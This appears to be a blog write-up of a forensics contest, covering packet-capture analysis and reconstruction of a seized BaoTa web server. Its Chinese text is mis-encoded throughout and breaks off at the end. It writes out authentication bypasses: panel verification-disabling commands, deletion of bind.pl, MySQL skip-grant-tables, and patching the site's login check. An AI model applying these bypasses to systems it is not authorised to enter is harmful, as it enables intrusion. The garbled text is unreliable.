id="6-å‡è®¾ä¸Šé¢˜ä¸­æ­£ç¡®çš„åŠ©è®°è¯ä¸ºé€šè¿‡ä¾¦å¯Ÿæ‰¾åˆ°çš„å«Œç–‘äººé’±åŒ…åŠ©è®°è¯å¤‡ä»½ï¼ˆå·²çŸ¥åœ°å€å±äºä»¥å¤ªåŠé“¾ï¼‰ï¼Œè¯·åœ¨æ¨¡æ‹Ÿå™¨ä¸­é€šè¿‡imToken-APPæ¢å¤å«Œç–‘äººé’±åŒ…ï¼Œå¹¶é€‰å‡ºæ­£ç¡®é’±åŒ…åœ°å€ï¼ˆ-ï¼‰"><a href="#6-å‡è®¾ä¸Šé¢˜ä¸­æ­£ç¡®çš„åŠ©è®°è¯ä¸ºé€šè¿‡ä¾¦å¯Ÿæ‰¾åˆ°çš„å«Œç–‘äººé’±åŒ…åŠ©è®°è¯å¤‡ä»½ï¼ˆå·²çŸ¥åœ°å€å±äºä»¥å¤ªåŠé“¾ï¼‰ï¼Œè¯·åœ¨æ¨¡æ‹Ÿå™¨ä¸­é€šè¿‡imToken-APPæ¢å¤å«Œç–‘äººé’±åŒ…ï¼Œå¹¶é€‰å‡ºæ­£ç¡®é’±åŒ…åœ°å€ï¼ˆ-ï¼‰" class="headerlink" title="6.å‡è®¾ä¸Šé¢˜ä¸­æ­£ç¡®çš„åŠ©è®°è¯ä¸ºé€šè¿‡ä¾¦å¯Ÿæ‰¾åˆ°çš„å«Œç–‘äººé’±åŒ…åŠ©è®°è¯å¤‡ä»½ï¼ˆå·²çŸ¥åœ°å€å±äºä»¥å¤ªåŠé“¾ï¼‰ï¼Œè¯·åœ¨æ¨¡æ‹Ÿå™¨ä¸­é€šè¿‡imToken APPæ¢å¤å«Œç–‘äººé’±åŒ…ï¼Œå¹¶é€‰å‡ºæ­£ç¡®é’±åŒ…åœ°å€ï¼ˆ ï¼‰"></a>6.å‡è®¾ä¸Šé¢˜ä¸­æ­£ç¡®çš„åŠ©è®°è¯ä¸ºé€šè¿‡ä¾¦å¯Ÿæ‰¾åˆ°çš„å«Œç–‘äººé’±åŒ…åŠ©è®°è¯å¤‡ä»½ï¼ˆå·²çŸ¥åœ°å€å±äºä»¥å¤ªåŠé“¾ï¼‰ï¼Œè¯·åœ¨æ¨¡æ‹Ÿå™¨ä¸­é€šè¿‡imToken APPæ¢å¤å«Œç–‘äººé’±åŒ…ï¼Œå¹¶é€‰å‡ºæ­£ç¡®é’±åŒ…åœ°å€ï¼ˆ ï¼‰</h2><h1 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h1><h2 id="1-åˆ†æâ€œæ•°æ®åŒ…1-capâ€ï¼Œè¯·é—®å®¢æˆ·ç«¯ä¸ºä»€ä¹ˆè®¿é—®ä¸äº†æœåŠ¡å™¨ã€‚ï¼ˆ-ï¼‰"><a href="#1-åˆ†æâ€œæ•°æ®åŒ…1-capâ€ï¼Œè¯·é—®å®¢æˆ·ç«¯ä¸ºä»€ä¹ˆè®¿é—®ä¸äº†æœåŠ¡å™¨ã€‚ï¼ˆ-ï¼‰" class="headerlink" title="1.åˆ†æâ€œæ•°æ®åŒ…1.capâ€ï¼Œè¯·é—®å®¢æˆ·ç«¯ä¸ºä»€ä¹ˆè®¿é—®ä¸äº†æœåŠ¡å™¨ã€‚ï¼ˆ ï¼‰"></a>1.åˆ†æâ€œæ•°æ®åŒ…1.capâ€ï¼Œè¯·é—®å®¢æˆ·ç«¯ä¸ºä»€ä¹ˆè®¿é—®ä¸äº†æœåŠ¡å™¨ã€‚ï¼ˆ ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-221648941.png" class="">  <p>é€šè¿‡åˆ†ætcpä¼šè¯å¯ä»¥å‘ç°10.5.0.19å¯¹116.211.168.203è¿›è¡Œäº†å¤§é‡çš„tcpè¿æ¥ï¼Œä¸”æ—¶é—´æçŸ­ï¼Œä¸”åªæœ‰è¿™ä¸ªipæœ‰è¿™ç§è¡Œä¸ºåˆ¤æ–­å…¶ä¸ºDOSæ”»å‡»(å•æœºå­)ã€‚DDOS(å¤šå¯¹ä¸€)<br>é€‰B</p><h2 id="2-åˆ†æâ€œæ•°æ®åŒ…1-capâ€ï¼Œå‡ºé—®é¢˜çš„æœåŠ¡å™¨IPåœ°å€æ˜¯-ã€‚ï¼ˆæ ¼å¼ï¼š127-0-0-1ï¼‰"><a href="#2-åˆ†æâ€œæ•°æ®åŒ…1-capâ€ï¼Œå‡ºé—®é¢˜çš„æœåŠ¡å™¨IPåœ°å€æ˜¯-ã€‚ï¼ˆæ ¼å¼ï¼š127-0-0-1ï¼‰" class="headerlink" title="2.åˆ†æâ€œæ•°æ®åŒ…1.capâ€ï¼Œå‡ºé—®é¢˜çš„æœåŠ¡å™¨IPåœ°å€æ˜¯_ã€‚ï¼ˆæ ¼å¼ï¼š127.0.0.1ï¼‰"></a>2.åˆ†æâ€œæ•°æ®åŒ…1.capâ€ï¼Œå‡ºé—®é¢˜çš„æœåŠ¡å™¨IPåœ°å€æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ¼å¼ï¼š127.0.0.1ï¼‰</h2><p>å‡ºé—®é¢˜çš„ipå°±æ˜¯æ¯dosçš„ipå³116.211.168.203<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-213859429.png" class="">  </p><p>116.211.168.203</p><h2 id="3-åˆ†æâ€œæ•°æ®åŒ…1-capâ€ï¼Œæ–‡ä»¶ä¸‹å‘æœåŠ¡å™¨çš„IPåœ°å€æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š127-0-0-1ï¼‰"><a href="#3-åˆ†æâ€œæ•°æ®åŒ…1-capâ€ï¼Œæ–‡ä»¶ä¸‹å‘æœåŠ¡å™¨çš„IPåœ°å€æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š127-0-0-1ï¼‰" class="headerlink" title="3.åˆ†æâ€œæ•°æ®åŒ…1.capâ€ï¼Œæ–‡ä»¶ä¸‹å‘æœåŠ¡å™¨çš„IPåœ°å€æ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š127.0.0.1ï¼‰"></a>3.åˆ†æâ€œæ•°æ®åŒ…1.capâ€ï¼Œæ–‡ä»¶ä¸‹å‘æœåŠ¡å™¨çš„IPåœ°å€æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š127.0.0.1ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-215325471.png" class="">  <p>120.210.129.29è¿”å›äº†java.logæ–‡ä»¶<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-215615284.png" class=""><br>ä¸”è¯¥æ–‡ä»¶æ˜¯ELFå¼€å¤´çš„å¯æ‰§è¡Œæ–‡ä»¶</p><h2 id="4-åˆ†æâ€œæ•°æ®åŒ…1-capâ€ï¼Œæ”»å‡»è€…åˆ©ç”¨-æ¼æ´è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šå°å†™ï¼Œæ— ä¸­æ–‡ï¼‰"><a href="#4-åˆ†æâ€œæ•°æ®åŒ…1-capâ€ï¼Œæ”»å‡»è€…åˆ©ç”¨-æ¼æ´è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šå°å†™ï¼Œæ— ä¸­æ–‡ï¼‰" class="headerlink" title="4.åˆ†æâ€œæ•°æ®åŒ…1.capâ€ï¼Œæ”»å‡»è€…åˆ©ç”¨_æ¼æ´è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šå°å†™ï¼Œæ— ä¸­æ–‡ï¼‰"></a>4.åˆ†æâ€œæ•°æ®åŒ…1.capâ€ï¼Œæ”»å‡»è€…åˆ©ç”¨<strong><em>_</em></strong>æ¼æ´è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šå°å†™ï¼Œæ— ä¸­æ–‡ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-222257051.png" class="">  <p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶å‘222.186.21.154å‘é€äº†è¯·æ±‚å¦‚ä¸‹<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-222420849.png" class=""><br>å…¶è¿›è¡Œäº†æ”»å‡»è¡Œä¸º<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-220004898.png" class="">  </p><h2 id="5-åˆ†æâ€œæ•°æ®åŒ…1-capâ€ï¼Œè¯·æå–æ¶æ„æ–‡ä»¶ï¼Œå¹¶æ ¡éªŒè¯¥æ–‡ä»¶çš„MD5å€¼ä¸º-ã€‚-æ ‡å‡†æ ¼å¼-abcd"><a href="#5-åˆ†æâ€œæ•°æ®åŒ…1-capâ€ï¼Œè¯·æå–æ¶æ„æ–‡ä»¶ï¼Œå¹¶æ ¡éªŒè¯¥æ–‡ä»¶çš„MD5å€¼ä¸º-ã€‚-æ ‡å‡†æ ¼å¼-abcd" class="headerlink" title="5.åˆ†æâ€œæ•°æ®åŒ…1.capâ€ï¼Œè¯·æå–æ¶æ„æ–‡ä»¶ï¼Œå¹¶æ ¡éªŒè¯¥æ–‡ä»¶çš„MD5å€¼ä¸º_ã€‚(æ ‡å‡†æ ¼å¼:abcd)"></a>5.åˆ†æâ€œæ•°æ®åŒ…1.capâ€ï¼Œè¯·æå–æ¶æ„æ–‡ä»¶ï¼Œå¹¶æ ¡éªŒè¯¥æ–‡ä»¶çš„MD5å€¼ä¸º<strong><em>_</em></strong>ã€‚(æ ‡å‡†æ ¼å¼:abcd)</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-224218051.png" class="">  <p>æå–å‡ºä¹‹å‰çš„java.logæ–‡ä»¶<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-224317212.png" class="">  </p><h2 id="6-åˆ†æâ€œæ•°æ®åŒ…2-capâ€ï¼Œå…¶è·å–æ–‡ä»¶çš„è·¯å¾„æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šD-X-X-1-txtï¼‰"><a href="#6-åˆ†æâ€œæ•°æ®åŒ…2-capâ€ï¼Œå…¶è·å–æ–‡ä»¶çš„è·¯å¾„æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šD-X-X-1-txtï¼‰" class="headerlink" title="6.åˆ†æâ€œæ•°æ®åŒ…2.capâ€ï¼Œå…¶è·å–æ–‡ä»¶çš„è·¯å¾„æ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šD:/X/X/1.txtï¼‰"></a>6.åˆ†æâ€œæ•°æ®åŒ…2.capâ€ï¼Œå…¶è·å–æ–‡ä»¶çš„è·¯å¾„æ˜¯<strong><em>__</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šD:/X/X/1.txtï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-224530253.png" class="">  <p>C:/Users/Administrator/Downloads/æ–°å»ºæ–‡ä»¶å¤¹/æ–°å»ºæ–‡ä»¶å¤¹/mail.png</p><h2 id="7-åˆ†æâ€œæ•°æ®åŒ…2-capâ€ï¼Œæ–‡ä»¶ä¸‹è½½æœåŠ¡å™¨çš„è®¤è¯è´¦å·å¯†ç æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123ï¼‰"><a href="#7-åˆ†æâ€œæ•°æ®åŒ…2-capâ€ï¼Œæ–‡ä»¶ä¸‹è½½æœåŠ¡å™¨çš„è®¤è¯è´¦å·å¯†ç æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123ï¼‰" class="headerlink" title="7.åˆ†æâ€œæ•°æ®åŒ…2.capâ€ï¼Œæ–‡ä»¶ä¸‹è½½æœåŠ¡å™¨çš„è®¤è¯è´¦å·å¯†ç æ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123ï¼‰"></a>7.åˆ†æâ€œæ•°æ®åŒ…2.capâ€ï¼Œæ–‡ä»¶ä¸‹è½½æœåŠ¡å™¨çš„è®¤è¯è´¦å·å¯†ç æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-225210947.png" class="">  <p>admin:passwd</p><h2 id="8-åˆ†æâ€œæ•°æ®åŒ…2-capâ€ï¼Œå…¶ä¸‹è½½çš„æ–‡ä»¶å¤§å°æœ‰-å­—èŠ‚ã€‚ï¼ˆæ ‡å‡†æ ¼å¼"><a href="#8-åˆ†æâ€œæ•°æ®åŒ…2-capâ€ï¼Œå…¶ä¸‹è½½çš„æ–‡ä»¶å¤§å°æœ‰-å­—èŠ‚ã€‚ï¼ˆæ ‡å‡†æ ¼å¼" class="headerlink" title="8.åˆ†æâ€œæ•°æ®åŒ…2.capâ€ï¼Œå…¶ä¸‹è½½çš„æ–‡ä»¶å¤§å°æœ‰__å­—èŠ‚ã€‚ï¼ˆæ ‡å‡†æ ¼å¼"></a>8.åˆ†æâ€œæ•°æ®åŒ…2.capâ€ï¼Œå…¶ä¸‹è½½çš„æ–‡ä»¶å¤§å°æœ‰<strong><em>__</em></strong>å­—èŠ‚ã€‚ï¼ˆæ ‡å‡†æ ¼å¼</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-224850505.png" class="">  <p>å¯¼å‡ºç›´æ¥çœ‹å°±å¯ä»¥äº†</p><h1 id="æœåŠ¡å™¨å–è¯"><a href="#æœåŠ¡å™¨å–è¯" class="headerlink" title="æœåŠ¡å™¨å–è¯"></a>æœåŠ¡å™¨å–è¯</h1><h2 id="1-æœåŠ¡å™¨ç³»ç»Ÿçš„ç‰ˆæœ¬å·æ˜¯-ã€‚ï¼ˆæ ¼å¼ï¼š1-1-1111ï¼‰"><a href="#1-æœåŠ¡å™¨ç³»ç»Ÿçš„ç‰ˆæœ¬å·æ˜¯-ã€‚ï¼ˆæ ¼å¼ï¼š1-1-1111ï¼‰" class="headerlink" title="1.æœåŠ¡å™¨ç³»ç»Ÿçš„ç‰ˆæœ¬å·æ˜¯_ã€‚ï¼ˆæ ¼å¼ï¼š1.1.1111ï¼‰"></a>1.æœåŠ¡å™¨ç³»ç»Ÿçš„ç‰ˆæœ¬å·æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ¼å¼ï¼š1.1.1111ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-092701110.png" class="">  <h2 id="2-ç½‘ç«™æ•°æ®åº“çš„ç‰ˆæœ¬å·æ˜¯-ã€‚ï¼ˆæ ¼å¼ï¼š1-1-1111ï¼‰"><a href="#2-ç½‘ç«™æ•°æ®åº“çš„ç‰ˆæœ¬å·æ˜¯-ã€‚ï¼ˆæ ¼å¼ï¼š1-1-1111ï¼‰" class="headerlink" title="2.ç½‘ç«™æ•°æ®åº“çš„ç‰ˆæœ¬å·æ˜¯_ã€‚ï¼ˆæ ¼å¼ï¼š1.1.1111ï¼‰"></a>2.ç½‘ç«™æ•°æ®åº“çš„ç‰ˆæœ¬å·æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ¼å¼ï¼š1.1.1111ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-092754403.png" class="">  <h2 id="3-å®å¡”é¢æ¿çš„â€œè¶…æ—¶â€æ—¶é—´æ˜¯-åˆ†é’Ÿã€‚ï¼ˆæ ¼å¼ï¼š50ï¼‰"><a href="#3-å®å¡”é¢æ¿çš„â€œè¶…æ—¶â€æ—¶é—´æ˜¯-åˆ†é’Ÿã€‚ï¼ˆæ ¼å¼ï¼š50ï¼‰" class="headerlink" title="3.å®å¡”é¢æ¿çš„â€œè¶…æ—¶â€æ—¶é—´æ˜¯_åˆ†é’Ÿã€‚ï¼ˆæ ¼å¼ï¼š50ï¼‰"></a>3.å®å¡”é¢æ¿çš„â€œè¶…æ—¶â€æ—¶é—´æ˜¯<strong><em>_</em></strong>åˆ†é’Ÿã€‚ï¼ˆæ ¼å¼ï¼š50ï¼‰</h2><p>ä»¿çœŸåé€šè¿‡sshè¿æ¥ã€‚æ‰“å¼€å®å¡”é¢æ¿ç™»é™†åä¼šå‘ç°å…¶éœ€è¦è¿›è¡ŒéªŒè¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤æ¥å…³é—­éªŒè¯<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bt default &amp;&amp; bt 23 &amp;&amp; bt 11 &amp;&amp; bt 12 &amp;&amp; bt 13 &amp;&amp; bt 24 &amp;&amp; bt 5 &amp;&amp; bt default</span><br></pre></td></tr></table></figure><br>è€Œåä¼šå‘ç°å…¶éœ€è¦æ‰‹æœºéªŒè¯ï¼Œè¿™æ—¶åæˆ‘ä»¬å¯ä»¥é€‰æ‹©é™ç‰ˆæœ¬åˆ°7.7ï¼Œç„¶ååˆ é™¤<br><code>rm -f /www/server/panel/data/bind.pl</code>å³å¯ç»•è¿‡<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-093215907.png" class="">  </p><h2 id="4-ç½‘ç«™æºç å¤‡ä»½å‹ç¼©æ–‡ä»¶SHA256å€¼æ˜¯-ã€‚ï¼ˆæ ¼å¼ï¼š64ä½å°å†™ï¼‰"><a href="#4-ç½‘ç«™æºç å¤‡ä»½å‹ç¼©æ–‡ä»¶SHA256å€¼æ˜¯-ã€‚ï¼ˆæ ¼å¼ï¼š64ä½å°å†™ï¼‰" class="headerlink" title="4.ç½‘ç«™æºç å¤‡ä»½å‹ç¼©æ–‡ä»¶SHA256å€¼æ˜¯_ã€‚ï¼ˆæ ¼å¼ï¼š64ä½å°å†™ï¼‰"></a>4.ç½‘ç«™æºç å¤‡ä»½å‹ç¼©æ–‡ä»¶SHA256å€¼æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ¼å¼ï¼š64ä½å°å†™ï¼‰</h2><p>æˆ‘ä»¬åœ¨/www/backup/siteå¯ä»¥æ‰¾åˆ°å¤‡ä»½æ–‡ä»¶ã€‚å¯ä»¥ç›´æ¥åœ¨ä»¿çœŸä¸‹è¿›è¡Œå¯¼å‡ºï¼Œä¹Ÿå¯ä»¥ç”¨ç«çœ¼ï¼Œä½†æ˜¯æˆ‘ç”¨ç«çœ¼å¯¼å‡ºçš„å¥½åƒæœ‰ç‚¹å°é—®é¢˜<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-093647658.png" class=""><br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-100114765.png" class="">  </p><h2 id="5-åˆ†å‘ç½‘ç«™sb-wiiudot-cnç®¡ç†å‘˜å¯†ç é»˜è®¤MD5åŠ å¯†ç›å€¼æ˜¯-ã€‚ï¼ˆæ ¼å¼ï¼šabcdï¼‰"><a href="#5-åˆ†å‘ç½‘ç«™sb-wiiudot-cnç®¡ç†å‘˜å¯†ç é»˜è®¤MD5åŠ å¯†ç›å€¼æ˜¯-ã€‚ï¼ˆæ ¼å¼ï¼šabcdï¼‰" class="headerlink" title="5.åˆ†å‘ç½‘ç«™sb.wiiudot.cnç®¡ç†å‘˜å¯†ç é»˜è®¤MD5åŠ å¯†ç›å€¼æ˜¯_ã€‚ï¼ˆæ ¼å¼ï¼šabcdï¼‰"></a>5.åˆ†å‘ç½‘ç«™sb.wiiudot.cnç®¡ç†å‘˜å¯†ç é»˜è®¤MD5åŠ å¯†ç›å€¼æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ¼å¼ï¼šabcdï¼‰</h2><p>åœ¨æºç é‡Œæœpasswordï¼Œå¯ä»¥æ‰¾åˆ°ç™»é™†çš„åŠ å¯†é€»è¾‘<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-100504045.png" class=""><br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-100518492.png" class="">  </p><h2 id="6-åˆ†å‘ç½‘ç«™sb-wiiudot-cnä¸€å…±å­˜æ”¾äº†-æ¡é€šè®¯å½•æ•°æ®ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1234ï¼‰"><a href="#6-åˆ†å‘ç½‘ç«™sb-wiiudot-cnä¸€å…±å­˜æ”¾äº†-æ¡é€šè®¯å½•æ•°æ®ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1234ï¼‰" class="headerlink" title="6. åˆ†å‘ç½‘ç«™sb.wiiudot.cnä¸€å…±å­˜æ”¾äº†_æ¡é€šè®¯å½•æ•°æ®ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1234ï¼‰"></a>6. åˆ†å‘ç½‘ç«™sb.wiiudot.cnä¸€å…±å­˜æ”¾äº†<strong><em>_</em></strong>æ¡é€šè®¯å½•æ•°æ®ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1234ï¼‰</h2><p>è¿™ä¸ªé¢˜æˆ‘ä»¬éœ€è¦é‡æ„å®å¡”æœåŠ¡å™¨ï¼Œ</p><h3 id="é‡æ„æ•°æ®åº“"><a href="#é‡æ„æ•°æ®åº“" class="headerlink" title="é‡æ„æ•°æ®åº“"></a>é‡æ„æ•°æ®åº“</h3><p>æˆ‘ä»¬å…ˆç™»é™†ä¸€ä¸‹mysql<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹/etc/my.cnfæ¥è¿›è¡Œç»•è¿‡ç™»é™†<br>ä½¿ç”¨systemctl stop mysqldå…³é—­mysqlï¼Œ<br>åœ¨/etc/my.cnfçš„<code>[mysqlid]</code>skip-grant-tables<br>ç„¶åsystemctl start mysqldæ‰“å¼€mysqlå°±èƒ½æ— å¯†ç ç™»é™†<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-111503613.png" class="">  </p><p>ç„¶åä½¿ç”¨Navicatæ‰“å¼€</p><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-111639811.png" class="" title="image.png1">  <p>å½“ç„¶ä»¥ä¸ºæ²¡æœ‰å¤–è¿æ‰€ä»¥æˆ‘ä»¬è¿˜æœ‰æ‰“å¼€sshéš§é“<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-111809221.png" class=""><br>æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨æ•°æ®åº“é‡ŒæŸ¥çœ‹åˆ°é€šä¿¡å½•æ•°æ®<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-114411864.png" class=""><br>æŸ¥è¯¢app_mobileçš„æ‰€æœ‰åˆ—å³å¯<br>ä½†è¿™å¹¶ä¸ä¸€å®šæ˜¯çœŸå®çš„æ•°æ®ã€‚æˆ‘ä»¬è¿˜éœ€è¦æ‰“å¼€ç½‘ç«™æ¥æŸ¥çœ‹</p><h3 id="é‡æ„ç½‘ç«™"><a href="#é‡æ„ç½‘ç«™" class="headerlink" title="é‡æ„ç½‘ç«™"></a>é‡æ„ç½‘ç«™</h3><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-112236614.png" class="">  <p>å…ˆå°†æ•°æ®åº“ä¿®æ”¹ä¸ºlocalhost</p><p>ç„¶åæˆ‘ä»¬å°†è§£æçš„åŸŸåè§£æä¿®æ”¹<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-112407597.png" class=""><br>æˆ‘çœ‹ç½‘ä¸Šéƒ½æ˜¯ä¿®æ”¹hostè§£æåœ°å€ï¼Œä½†æ˜¯æˆ‘æ‡’ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç›´æ¥åœ¨å®å¡”é‡ŒåŠ äº†ä¸€ä¸ªæ–°çš„åœ°å€</p><p>è¿™æ ·ç½‘ç«™å°±å¯ä»¥æ­£å¸¸è®¿é—®äº†<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-112707706.png" class="">  </p><p>æˆ‘ä»¬åœ¨adminè·¯å¾„æ¥è¿›è¡Œç™»é™†<br>![<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-112821753.png" class=""><br>æˆ‘ä»¬é€šè¿‡å›æ˜¾çš„ä¿¡æ¯å¯ä»¥å®šä½åˆ°ç™»é™†çš„æºç </p><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-113939979.png" class="">  <p>æˆ‘ä»¬ç›´æ¥æ”¹é‰´æƒ<br>ç„¶åå°±å¯ä»¥éšä¾¿ç™»é™†åå°äº†<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-114112793.png" class="">  </p><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-114747684.png" class="">  <p>æˆ‘å»å®é™…ä¸Šç«Ÿç„¶æ˜¯67096</p><h2 id="7-å…¨éƒ¨ç½‘ç«™ä¸€å…±æœ‰-åå—å®³äººã€‚ï¼ˆæ ¼å¼ï¼šxxxã€‚ä¸å»é‡-ä¸è¿›è¡Œæ•°æ®æ¢å¤ï¼‰"><a href="#7-å…¨éƒ¨ç½‘ç«™ä¸€å…±æœ‰-åå—å®³äººã€‚ï¼ˆæ ¼å¼ï¼šxxxã€‚ä¸å»é‡-ä¸è¿›è¡Œæ•°æ®æ¢å¤ï¼‰" class="headerlink" title="7.å…¨éƒ¨ç½‘ç«™ä¸€å…±æœ‰_åå—å®³äººã€‚ï¼ˆæ ¼å¼ï¼šxxxã€‚ä¸å»é‡,ä¸è¿›è¡Œæ•°æ®æ¢å¤ï¼‰"></a>7.å…¨éƒ¨ç½‘ç«™ä¸€å…±æœ‰<strong><em>_</em></strong>åå—å®³äººã€‚ï¼ˆæ ¼å¼ï¼šxxxã€‚ä¸å»é‡,ä¸è¿›è¡Œæ•°æ®æ¢å¤ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-115939869.png" class="">  <p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å™¨useridåº”è¯¥å°±ä»£è¡¨ç€å—å®³è€…ã€‚é‚£ä¹ˆæˆ‘ä»¬åªæœ‰æŸ¥æ‰€æœ‰ç½‘ç«™æ•°æ®åº“ä¸åŒçš„useridå³å¯<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-115510066.png" class=""><br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-122550533.png" class="">  </p><p>å…¶ä»–ç½‘ç«™çš„æ•°æ®åº“åç§°å¯ä»¥é€šè¿‡æºç æ¥çœ‹<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-122901833.png" class="">  </p><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-123005785.png" class="">  <img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-122943293.png" class="">  <p>åŠ èµ·æ¥å°±æ˜¯506</p><h2 id="8-åˆ†å‘ç½‘ç«™tf-chongwuxiaoyouxi-comé‡Œé¢ä¸€å…±æœ‰-ä½â€œç»„å‘˜çº§åˆ«â€çš„ç®¡ç†å‘˜ã€‚ï¼ˆæ ¼å¼ï¼šæ•°å­—ï¼‰"><a href="#8-åˆ†å‘ç½‘ç«™tf-chongwuxiaoyouxi-comé‡Œé¢ä¸€å…±æœ‰-ä½â€œç»„å‘˜çº§åˆ«â€çš„ç®¡ç†å‘˜ã€‚ï¼ˆæ ¼å¼ï¼šæ•°å­—ï¼‰" class="headerlink" title="8.åˆ†å‘ç½‘ç«™tf.chongwuxiaoyouxi.comé‡Œé¢ä¸€å…±æœ‰_ä½â€œç»„å‘˜çº§åˆ«â€çš„ç®¡ç†å‘˜ã€‚ï¼ˆæ ¼å¼ï¼šæ•°å­—ï¼‰"></a>8.åˆ†å‘ç½‘ç«™tf.chongwuxiaoyouxi.comé‡Œé¢ä¸€å…±æœ‰<strong><em>_</em></strong>ä½â€œç»„å‘˜çº§åˆ«â€çš„ç®¡ç†å‘˜ã€‚ï¼ˆæ ¼å¼ï¼šæ•°å­—ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-123556997.png" class="">  <img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-123455249.png" class="">  <p>æŸ¥çœ‹app_admin_cateå¯ä»¥çŸ¥é“å½“cate_idä¸º22æ—¶ä¸ºæ™®é€šæˆå‘˜</p><p>å½“ç„¶å¯ä»¥é€šè¿‡ç™»é™†ç½‘ç«™æ¥è¿›è¡Œã€‚å’Œå‰é¢çš„ä¸€æ ·ï¼Œåªæ˜¯æˆ‘ä»¬è¿˜éœ€è¦æ”¹ä¸€ä¸‹å™¨ä¼ªé™æ€è§„åˆ™ï¼Œç›´æ¥å°†ä¹‹å‰ç½‘ç«™çš„ä¼ªé™æ€è§„åˆ™å¤åˆ¶è¿‡æ¥å°±è¡Œäº†<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-125031469.png" class=""><br><img 